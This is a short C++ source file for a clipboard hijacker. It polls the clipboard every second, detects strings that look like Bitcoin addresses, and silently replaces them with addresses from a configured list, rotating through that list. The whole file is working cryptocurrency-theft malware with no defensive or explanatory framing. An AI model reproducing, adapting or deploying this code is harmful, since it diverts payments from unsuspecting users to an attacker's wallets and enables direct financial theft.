#include <iostream>
#include <string>
#include <algorithm>
#include "Config.hpp"
#include "Clipboard.hpp"

#if defined(__linux__)
#include <unistd.h>
#define Sleep(x) usleep((x) * 1000)
#endif

bool isBitcoinAddress(const std::string& str)
{
    if(str.at(0) != '1' && str.at(0) != '3')
        return false;

    size_t strLength = str.length();
    if(strLength < 26 || strLength > 35)
        return false;

    bool isAlphaNumeric = find_if(str.cbegin(), str.cend(), [](char c)
    {
        return !(isalnum(c) || (c == ' '));
    }) == str.cend();

    return isAlphaNumeric;
}
int main()
{
    Clipboard clipboard;
    size_t iBitcoinAddresses = 0;
    std::string oldAddressSet;
    while(1)
    {
        std::string clipboardContents = clipboard.getClipboard();
        if(isBitcoinAddress(clipboardContents))
        {
            if(oldAddressSet != clipboardContents)
            {
                std::string addressToSet = config::bitcoinAddresses.at
                    (iBitcoinAddresses);
                clipboard.setClipboard(addressToSet);
                oldAddressSet = addressToSet;
                iBitcoinAddresses = (iBitcoinAddresses + 1) %
                    config::bitcoinAddressesSize;
            }
        }

        Sleep(1000);
    }
    return 0;
}
